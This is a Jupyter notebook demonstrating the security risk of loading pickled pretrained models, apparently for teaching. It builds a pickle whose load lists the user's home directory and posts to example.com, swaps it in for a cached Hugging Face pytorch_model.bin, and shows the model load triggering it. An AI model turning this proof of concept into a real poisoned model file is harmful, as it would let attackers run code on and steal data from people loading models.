{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "c0232b54-360d-49f4-8945-e7684808d209",
   "metadata": {},
   "source": [
    "---\n",
    "---\n",
    "# Pretrained Model Security Risk\n",
    "\n",
    "This notebook contains a simple demonstration of one type of risk associated with using a pretrained model."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 18,
   "id": "3f3c4b05-f21e-4520-aabb-b88c553877eb",
   "metadata": {},
   "outputs": [],
   "source": [
    "import pickle\n",
    "import requests\n",
    "import os\n",
    "from transformers import AutoTokenizer, AutoModel\n",
    "import torch"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "6ff035c0-44ae-44d9-8202-7ab077d32161",
   "metadata": {},
   "source": [
    "---\n",
    "### Loading a pre-trained model from Hugging Face"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "id": "d8407f7a-13f8-4055-9b3a-fc7b53bef4fd",
   "metadata": {},
   "outputs": [
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "Downloading (…)okenizer_config.json: 100%|████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████| 398/398 [00:00<00:00, 215kB/s]\n",
      "Downloading (…)solve/main/vocab.txt: 100%|█████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████| 248k/248k [00:00<00:00, 5.89MB/s]\n",
      "Downloading (…)/main/tokenizer.json: 100%|█████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████| 735k/735k [00:00<00:00, 4.17MB/s]\n",
      "Downloading (…)cial_tokens_map.json: 100%|███████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████| 125/125 [00:00<00:00, 56.7kB/s]\n",
      "Downloading (…)lve/main/config.json: 100%|████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████| 753/753 [00:00<00:00, 256kB/s]\n",
      "Downloading pytorch_model.bin: 100%|███████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████| 269M/269M [00:03<00:00, 68.4MB/s]\n"
     ]
    }
   ],
   "source": [
    "model_name = \"gg-ai/distill-bert-1220\"\n",
    "tokenizer = AutoTokenizer.from_pretrained(model_name)\n",
    "model = AutoModel.from_pretrained(model_name)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "432e6f42-22b0-4dba-934d-201edca5804b",
   "metadata": {},
   "source": [
    "Loading a pretrained model results in downloading the directory shown below.\n",
    "\n",
    "Note the link `pytorch_model.bin` points at a file that is a pickle. This is a binary file that contains the byte stream from serializing an object (a Pytorch model in this case)."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "id": "082b9d28-9dbf-4ada-ab0e-577ee504953a",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "\u001b[01;34m/Users/aaron/.cache/huggingface/hub/models--gg-ai--distill-bert-1220\u001b[0m\n",
      "├── \u001b[01;34mblobs\u001b[0m\n",
      "│   ├── \u001b[00m0bcbea577210dc608bcd9dfd932d0e7eb49890da\u001b[0m\n",
      "│   ├── \u001b[00m10752ff4bd656c542cac209e9e034e5d3a5a0979\u001b[0m\n",
      "│   ├── \u001b[00m5994899e3a01721d74cafd0a7ada28588707f759\u001b[0m\n",
      "│   ├── \u001b[00m8f80d4a1897f3fdc6d8b2e13a426108eb3f771b6\u001b[0m\n",
      "│   ├── \u001b[00m90608f51a38c6de28bdde4c028f7a167f568ffc20e27bc74a371f5541c26c8da\u001b[0m\n",
      "│   └── \u001b[00ma8b3208c2884c4efb86e49300fdd3dc877220cdf\u001b[0m\n",
      "├── \u001b[01;34mrefs\u001b[0m\n",
      "│   └── \u001b[00mmain\u001b[0m\n",
      "└── \u001b[01;34msnapshots\u001b[0m\n",
      "    └── \u001b[01;34m39fb408f872303ffc0bff9dc4f8ba95e150eae53\u001b[0m\n",
      "        ├── \u001b[01;36mconfig.json\u001b[0m -> \u001b[00m../../blobs/5994899e3a01721d74cafd0a7ada28588707f759\u001b[0m\n",
      "        ├── \u001b[01;36mpytorch_model.bin\u001b[0m -> \u001b[00m../../blobs/90608f51a38c6de28bdde4c028f7a167f568ffc20e27bc74a371f5541c26c8da\u001b[0m\n",
      "        ├── \u001b[01;36mspecial_tokens_map.json\u001b[0m -> \u001b[00m../../blobs/a8b3208c2884c4efb86e49300fdd3dc877220cdf\u001b[0m\n",
      "        ├── \u001b[01;36mtokenizer.json\u001b[0m -> \u001b[00m../../blobs/0bcbea577210dc608bcd9dfd932d0e7eb49890da\u001b[0m\n",
      "        ├── \u001b[01;36mtokenizer_config.json\u001b[0m -> \u001b[00m../../blobs/10752ff4bd656c542cac209e9e034e5d3a5a0979\u001b[0m\n",
      "        └── \u001b[01;36mvocab.txt\u001b[0m -> \u001b[00m../../blobs/8f80d4a1897f3fdc6d8b2e13a426108eb3f771b6\u001b[0m\n",
      "\n",
      "5 directories, 13 files\n"
     ]
    }
   ],
   "source": [
    "!tree /Users/aaron/.cache/huggingface/hub/models--gg-ai--distill-bert-1220"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "a405cd2c-e7d8-4b14-8de7-4ca1a963fd3f",
   "metadata": {},
   "source": [
    "---\n",
    "### Suppose the `.bin` was malicious\n",
    "\n",
    "Let's create a pickle that does something dangerous and replace `pytorch_model.bin`. \n",
    "\n",
    "And because this is a binary file that saves the byte stream from serialization, you can't inspect it before unserializing it."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 15,
   "id": "899e1c17-d674-45a5-959f-e52a534a7053",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "['.config', 'Music', '.docker', '.vim', '.DS_Store', 'nltk_data', '.CFUserTextEncoding', '.zshrc', '.local', 'Projects', 'Pictures', '.zprofile', '.zsh_history', '.ipython', 'Desktop', 'Library', '.matplotlib', '.lesshst', '.cups', 'Public', '.keepassxc', '.ssh', 'Movies', '.vimrc', '.Trash', '.jupyter', '.npm', '.terraform.d', 'Documents', '.pyenv', '.vscode', 'Downloads', '.python_history', '.cache', '.aws', '.gitconfig', '.viminfo', '.zsh_sessions']\n",
      "\n",
      "<Response [200]>\n"
     ]
    }
   ],
   "source": [
    "class GetRequestOnUnpickle:\n",
    "    def __init__(self):\n",
    "        print(os.listdir(os.path.expanduser(\"~\")))\n",
    "        print('')\n",
    "        response = requests.post(\"https://www.example.com\")\n",
    "        print(response)\n",
    "        \n",
    "    def __reduce__(self):\n",
    "        return (self.__class__, ())\n",
    "\n",
    "\n",
    "obj = GetRequestOnUnpickle()\n",
    "\n",
    "with open('risky.pickle', 'wb') as f:\n",
    "    pickle.dump(obj, f)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 16,
   "id": "7857aec1-554c-46b6-80f2-ab9283bac6cc",
   "metadata": {},
   "outputs": [],
   "source": [
    "#!mv /Users/aaron/.cache/huggingface/hub/models--gg-ai--distill-bert-1220/blobs/90608f51a38c6de28bdde4c028f7a167f568ffc20e27bc74a371f5541c26c8da /Users/aaron/.cache/huggingface/hub/models--gg-ai--distill-bert-1220/blobs/90608f51a38c6de28bdde4c028f7a167f568ffc20e27bc74a371f5541c26c8da_real\n",
    "!mv /Users/aaron/Projects/pickles/risky.pickle /Users/aaron/.cache/huggingface/hub/models--gg-ai--distill-bert-1220/blobs/90608f51a38c6de28bdde4c028f7a167f568ffc20e27bc74a371f5541c26c8da"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "cf3f01c4-029e-42a1-8819-727b98739b85",
   "metadata": {},
   "source": [
    "Now, if you loaded a model that contained this `.bin`, it accesses your file system and sends a post request!"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 20,
   "id": "3c2693fa-0ead-4b61-9a0d-dd7d0eb4fa70",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "['.config', 'Music', '.docker', '.vim', '.DS_Store', 'nltk_data', '.CFUserTextEncoding', '.zshrc', '.local', 'Projects', 'Pictures', '.zprofile', '.zsh_history', '.ipython', 'Desktop', 'Library', '.matplotlib', '.lesshst', '.cups', 'Public', '.keepassxc', '.ssh', 'Movies', '.vimrc', '.Trash', '.jupyter', '.npm', '.terraform.d', 'Documents', '.pyenv', '.vscode', 'Downloads', '.python_history', '.cache', '.aws', '.gitconfig', '.viminfo', '.zsh_sessions']\n",
      "\n",
      "<Response [200]>\n"
     ]
    }
   ],
   "source": [
    "try:\n",
    "    model = AutoModel.from_pretrained(model_name)\n",
    "except:\n",
    "    pass"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "7b20eb9f-5f5d-48df-9e04-0953818010c5",
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3 (ipykernel)",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.9.17"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
